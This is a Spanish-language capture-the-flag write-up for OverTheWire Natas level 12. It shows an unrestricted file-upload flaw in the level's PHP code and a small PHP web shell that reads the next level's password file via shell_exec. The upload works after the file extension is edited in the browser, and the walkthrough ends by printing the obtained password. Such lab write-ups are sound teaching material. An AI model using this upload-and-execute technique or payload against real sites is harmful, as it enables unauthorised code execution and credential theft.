Para resolver este nivel, va a ser algo facil, lo primero que nos damos cuenta analizando el código, es que es un servicio en el que se pueden subir imagenes, pero el creador de la página cometió un pequeño error que es dejar libre la parte del post y las cookies al usuario, entonces vamos a aprovechar a explotar eso, nos fijamos en esta parte del código
``` php
`if(array_key_exists("filename", $_POST)) {    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);`
// ......
`<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />`
```
Al tener esto nos damos cuenta que podemos cambiar la extensión del archivo y vamos a usarlo a nuestro favor, primero vamos a crear un exploit php que busque la ruta que queremos recordando que las contraseñas del natas están ubicadas en /etc/natas_webpass
``` php
<?php
echo shell_exec("cat /etc/natas_webpass/natas13");
?>
```
Después vamos a subir el archivo y antes de darle al archivo upload vamos a editar la extensión del archivo desde el navegador con el f12
![](../../../images/Pasted%20image%2020260422134934.png)
![](../../../images/Pasted%20image%2020260422134949.png)
Una vez hecho esto subimos el archivo y nos dirigimos al enlace proporcionado
![](../../../images/Pasted%20image%2020260422135851.png)
Nos dirigimos al enlace y nos damos cuenta que nuestro script funcionó y nos da la siguiente contraseña 
``` bash
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```



